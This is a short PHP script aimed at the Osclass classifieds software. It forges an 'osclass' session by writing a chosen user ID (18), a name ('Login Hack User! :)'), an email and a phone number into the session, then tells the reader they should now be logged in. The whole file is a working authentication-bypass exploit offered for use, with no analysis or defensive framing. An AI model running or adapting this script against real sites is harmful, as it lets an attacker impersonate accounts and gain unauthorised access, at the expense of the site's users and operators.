<?php

    session_name("osclass");
    session_start();

    $_SESSION["userId"] = 18; //osclass id lookup
    $_SESSION["userName"] = "Login Hack User! :)";

    $_SESSION["userEmail"] = "user@example.com";
    $_SESSION["userPhone"] = "555-555-5555";

session_write_close();

?>

You should now be logged in. Go back to the main page to confirm...

